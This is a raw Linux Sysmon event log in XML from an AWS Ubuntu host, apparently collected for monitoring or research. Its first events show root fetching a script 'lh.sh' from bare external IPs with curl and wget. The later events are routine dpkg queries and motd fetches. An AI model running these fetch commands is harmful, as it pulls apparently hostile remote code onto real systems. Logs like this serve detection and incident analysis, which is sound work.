<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T13:27:14.293778000Z"/><EventRecordID>27318378</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 13:27:14.299</Data><Data Name="ProcessGuid">{ec2d99e9-a732-61b4-785d-d223b3550000}</Data><Data Name="ProcessId">13753</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s 80.71.158.11/lh.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">243</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">13751</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T13:27:14.514657000Z"/><EventRecordID>27318379</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 13:27:14.521</Data><Data Name="ProcessGuid">{ec2d99e9-a732-61b4-785d-d223b3550000}</Data><Data Name="ProcessId">13753</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T13:27:14.515384000Z"/><EventRecordID>27318380</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 13:27:14.521</Data><Data Name="ProcessGuid">{ec2d99e9-a732-61b4-70cc-3d0f70550000}</Data><Data Name="ProcessId">13754</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget -q -O- 80.71.158.11/lh.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">243</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">13751</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T13:27:14.728375000Z"/><EventRecordID>27318399</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 13:27:14.734</Data><Data Name="ProcessGuid">{ec2d99e9-a732-61b4-70cc-3d0f70550000}</Data><Data Name="ProcessId">13754</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T13:29:56.847978000Z"/><EventRecordID>27325670</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 13:29:56.853</Data><Data Name="ProcessGuid">{ec2d99e9-a7d4-61b4-787d-a086d1550000}</Data><Data Name="ProcessId">13758</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s 80.71.158.12/lh.sh</Data><Data Name="CurrentDirectory">/home/ubuntu</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">243</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-a6ec-61b4-0854-8e1210560000}</Data><Data Name="ParentProcessId">13740</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T13:30:23.762555000Z"/><EventRecordID>27326356</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 13:30:23.768</Data><Data Name="ProcessGuid">{ec2d99e9-a7d4-61b4-787d-a086d1550000}</Data><Data Name="ProcessId">13758</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T14:49:05.681098000Z"/><EventRecordID>27502895</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 14:49:05.685</Data><Data Name="ProcessGuid">{ec2d99e9-ba61-61b4-70b1-7cca5a550000}</Data><Data Name="ProcessId">13887</Data><Data Name="Image">/usr/bin/dpkg</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg -l wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">13884</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T14:49:05.685477000Z"/><EventRecordID>27502896</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 14:49:05.685</Data><Data Name="ProcessGuid">{ec2d99e9-ba61-61b4-a072-296da4550000}</Data><Data Name="ProcessId">13887</Data><Data Name="Image">/usr/bin/dpkg-query</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg-query --list -- wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">13884</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T14:49:06.146278000Z"/><EventRecordID>27503054</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 14:49:06.152</Data><Data Name="ProcessGuid">{ec2d99e9-ba62-61b4-703c-34bb7a550000}</Data><Data Name="ProcessId">13915</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1060-aws/x86_64 Intel(R)/Xeon(R)/Platinum/8175M/CPU/@/2.50GHz cloud_id/aws -O- --content-on-error https://motd.ubuntu.com</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-ba61-61b4-68b2-9bf6b8550000}</Data><Data Name="ParentProcessId">13874</Data><Data Name="ParentImage">/bin/dash</Data><Data Name="ParentCommandLine">/bin/sh</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T14:49:06.151240000Z"/><EventRecordID>27503055</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 14:49:06.157</Data><Data Name="ProcessGuid">{ec2d99e9-ba62-61b4-703c-34bb7a550000}</Data><Data Name="ProcessId">13915</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">47816</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-11T14:49:07.313402000Z"/><EventRecordID>27504108</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-11 14:49:07.319</Data><Data Name="ProcessGuid">{ec2d99e9-ba62-61b4-703c-34bb7a550000}</Data><Data Name="ProcessId">13915</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">54538</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">34.243.160.129</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T03:38:27.556499000Z"/><EventRecordID>29248625</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 03:38:27.562</Data><Data Name="ProcessGuid">{ec2d99e9-6eb3-61b5-70b1-73b8c6550000}</Data><Data Name="ProcessId">15575</Data><Data Name="Image">/usr/bin/dpkg</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg -l wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">15574</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T03:38:27.558667000Z"/><EventRecordID>29248627</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 03:38:27.562</Data><Data Name="ProcessGuid">{ec2d99e9-6eb3-61b5-a072-8811d5550000}</Data><Data Name="ProcessId">15575</Data><Data Name="Image">/usr/bin/dpkg-query</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg-query --list -- wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">15574</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T03:38:27.990344000Z"/><EventRecordID>29248928</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 03:38:27.996</Data><Data Name="ProcessGuid">{ec2d99e9-6eb3-61b5-706c-08d23a560000}</Data><Data Name="ProcessId">15599</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1060-aws/x86_64 Intel(R)/Xeon(R)/Platinum/8175M/CPU/@/2.50GHz cloud_id/aws -O- --content-on-error https://motd.ubuntu.com</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-6eb3-61b5-6852-fab2e5550000}</Data><Data Name="ParentProcessId">15560</Data><Data Name="ParentImage">/bin/dash</Data><Data Name="ParentCommandLine">/bin/sh</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T03:38:27.994680000Z"/><EventRecordID>29248929</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 03:38:28.001</Data><Data Name="ProcessGuid">{ec2d99e9-6eb3-61b5-706c-08d23a560000}</Data><Data Name="ProcessId">15599</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">39785</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T03:39:35.384018000Z"/><EventRecordID>29251052</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 03:39:35.390</Data><Data Name="ProcessGuid">{ec2d99e9-6eb3-61b5-706c-08d23a560000}</Data><Data Name="ProcessId">15599</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T21:26:05.678082000Z"/><EventRecordID>31696553</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 21:26:05.684</Data><Data Name="ProcessGuid">{ec2d99e9-68ed-61b6-7081-189661550000}</Data><Data Name="ProcessId">17646</Data><Data Name="Image">/usr/bin/dpkg</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg -l wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">17645</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T21:26:05.680524000Z"/><EventRecordID>31696555</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 21:26:05.684</Data><Data Name="ProcessGuid">{ec2d99e9-68ed-61b6-a032-ebaa44560000}</Data><Data Name="ProcessId">17646</Data><Data Name="Image">/usr/bin/dpkg-query</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">dpkg-query --list -- wget</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data><Data Name="ParentProcessId">17645</Data><Data Name="ParentImage">-</Data><Data Name="ParentCommandLine">-</Data><Data Name="ParentUser">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T21:26:06.143951000Z"/><EventRecordID>31696833</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 21:26:06.150</Data><Data Name="ProcessGuid">{ec2d99e9-68ee-61b6-70bc-ab7065550000}</Data><Data Name="ProcessId">17670</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1060-aws/x86_64 Intel(R)/Xeon(R)/Platinum/8175M/CPU/@/2.50GHz cloud_id/aws -O- --content-on-error https://motd.ubuntu.com</Data><Data Name="CurrentDirectory">/</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">4294967295</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-68ed-61b6-68e2-611a41560000}</Data><Data Name="ParentProcessId">17633</Data><Data Name="ParentImage">/bin/dash</Data><Data Name="ParentCommandLine">/bin/sh</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T21:26:06.148434000Z"/><EventRecordID>31696834</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 21:26:06.154</Data><Data Name="ProcessGuid">{ec2d99e9-68ee-61b6-70bc-ab7065550000}</Data><Data Name="ProcessId">17670</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">43096</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T21:26:06.278444000Z"/><EventRecordID>31696844</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 21:26:06.284</Data><Data Name="ProcessGuid">{ec2d99e9-68ee-61b6-70bc-ab7065550000}</Data><Data Name="ProcessId">17670</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">52314</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">54.171.230.55</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-12T21:26:06.666163000Z"/><EventRecordID>31697237</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-12 21:26:06.672</Data><Data Name="ProcessGuid">{ec2d99e9-68ee-61b6-70bc-ab7065550000}</Data><Data Name="ProcessId">17670</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
